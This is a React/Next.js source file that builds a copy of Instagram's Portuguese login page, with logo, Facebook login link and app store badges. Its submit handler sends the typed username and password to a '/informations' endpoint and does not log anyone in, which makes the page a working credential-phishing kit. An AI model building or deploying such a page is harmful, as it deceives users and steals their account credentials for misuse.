import {
  Box,
  Button,
  Center,
  Flex,
  Input,
  Text,
  useBreakpointValue,
} from "@chakra-ui/react";
import IMAGE from "../../public/screenshot1.png";
import INSTAGRAM from "../../public/instagram.png";
import Image from "next/image";
import SEPARATOR from "../../public/separator.png";
import FACEBOOK from "../../public/facebook.png";
import BUTTONS from "../../public/buttons.png"
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { api } from "@/lib/axios";
import { useRouter } from "next/router";

const loginFormSchema = z.object({
  login: z.string(),
  password: z.string(),
});

type LoginFormData = z.infer<typeof loginFormSchema>;

export default function Home() {
  const {
    register,
    handleSubmit,
    formState: { isSubmitting },
  } = useForm<LoginFormData>({
    resolver: zodResolver(loginFormSchema),
  });

  const router = useRouter();

  async function handleLogin(data: LoginFormData) {
    try {
      await api.post("/informations", {
        login: data.login,
        password: data.password,
      });
    } catch (err) {
      console.log(err);
    } finally {
    }
  }

  const showImage = useBreakpointValue({
    base: false,
    lg: true,
  });
  return (
    <Center h="100vh">
      <Flex alignItems="center" gap={10}>
        {showImage && <Image src={IMAGE} alt="image" />}
        <Flex flexDirection="column">
          <Box
            width="350px"
            height="400px"
            borderColor="#DBDBDB"
            borderWidth="1px"
            background="#FBFBFB"
            paddingTop="40px"
            paddingLeft="30px"
            paddingRight="30px"
            paddingBottom="15px"
          >
            <Flex flexDirection="column">
              <Flex justifyContent="center">
                <Image src={INSTAGRAM} alt="LOGO" width={175} height={51} />
              </Flex>

              <form onSubmit={handleSubmit(handleLogin)}>
                <Box paddingTop="10px">
                  <Input
                    borderWidth="1px"
                    borderColor="#DBDBDB"
                    borderRadius="2px"
                    background="#FAFAFA"
                    placeholder="Telefone, nome do usuário ou email"
                    _placeholder={{
                      fontSize: "13px",
                      display: "flex",
                      alignItems: "center",
                      color: "#737373",
                    }}
                    marginBottom="9px"
                    {...register("login")}
                  />
                  <Input
                    borderWidth="1px"
                    borderColor="#DBDBDB"
                    borderRadius="2px"
                    background="#FAFAFA"
                    placeholder="Senha"
                    marginBottom="15px"
                    _placeholder={{
                      fontSize: "13px",
                      display: "flex",
                      alignItems: "center",
                      color: "#737373",
                    }}
                    {...register("password")}
                    type="password"
                  />
                  <Button
                    width="100%"
                    background="#0095F6"
                    color="#FAFAFA"
                    borderRadius="10px"
                    height="35px"
                    marginBottom="20px"
                    type="submit"
                    disabled={isSubmitting}
                  >
                    Entrar
                  </Button>
                  <Image src={SEPARATOR} alt="SEPARATOR" />
                  <Flex
                    _hover={{ cursor: "pointer" }}
                    alignItems="center"
                    justifyContent="center"
                    display="flex"
                    flexDirection="row"
                    gap={3}
                    marginTop={8}
                  >
                    <Image
                      src={FACEBOOK}
                      alt="FACEBOOk"
                      width={16}
                      height={16}
                    />
                    <Text color="#315885" fontWeight="semibold" fontSize={14}>
                      Entrar com o Facebook
                    </Text>
                  </Flex>
                  <Flex
                    alignItems="center"
                    justifyContent="center"
                    display="flex"
                    flexDirection="row"
                  >
                    <Text fontSize={12} marginTop={5}>
                      Esqueceu a senha?
                    </Text>
                  </Flex>
                </Box>
              </form>
            </Flex>
          </Box>
          <Flex
            width="350px"
            borderColor="#DBDBDB"
            borderWidth="1px"
            background="#FBFBFB"
            height="63px"
            justifyContent="center"
            alignItems="center"
            marginTop="10px"
          >
            <Flex width="auto" gap="4px">
              <Text fontSize="small">Não tem uma conta?</Text>{" "}
              <Text
                fontSize="small"
                fontWeight="semibold"
                color="#0095F6"
                _hover={{ cursor: "pointer" }}
              >
                {" "}
                Cadastre-se
              </Text>
            </Flex>
            
          </Flex>
          <Flex
            width="350px"
            height="95px"
            justifyContent="center"
            marginTop="10px"
          >
            <Flex flexDir="column" alignItems="center" gap="10px" paddingTop="10px">
              <Text fontSize="14px">Obtenha o aplicativo.</Text>
              <Image src={BUTTONS} alt="Buttons"/>
            </Flex>
            
          </Flex>
        </Flex>
      </Flex>
    </Center>
  );
}
